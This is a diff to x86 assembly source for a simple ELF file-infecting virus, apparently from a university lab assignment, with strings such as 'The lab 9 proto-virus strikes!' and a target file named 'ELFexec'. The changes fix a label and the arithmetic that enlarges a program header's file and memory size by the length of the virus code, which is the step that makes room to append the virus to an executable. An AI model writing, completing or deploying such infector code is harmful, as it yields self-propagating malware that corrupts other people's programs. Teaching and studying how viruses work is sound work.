@@ -144,15 +144,15 @@ _start:	push	ebp
 	mov dword [ebp-36],ebx ; save vaddr2
 
 
-	.modify_ph:
+modify_ph:
 	mov ecx,ebp
 	sub ecx,200
 	add ecx,HEADER_SIZE
 	add ecx,PHDR_size ; Ecx holds the addr of the second hdr in size
 	mov dword [ebp-40],ecx ; save the location of the second phdr
 	mov eax, dword [ecx+PHDR_filesize]; ph size
-	add eax, virus_end-my_start; virus code length
 	sub eax,dword [ecx+PHDR_offset] ; finish their calculation .EAX holds the new filesize and memsize
+	add eax, virus_end-my_start ; virus code length
 	mov dword [ecx+PHDR_filesize],eax
 	mov dword [ecx+PHDR_memsize],eax
 	lseek dword [ebp-8],dword [ebp-28],SEEK_SET
@@ -186,11 +186,7 @@ _start:	push	ebp
 	jmp ebx
 VirusExit:
        exit 0            ; Termination if all is OK and no previous code to jump to
-                         ; (also an example for use of above macros)
-
-
-
-
+                         ; (also an example for use of above macros
 FileName:	db "ELFexec", 0
 hello: db "This is a virus",10,0
 OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
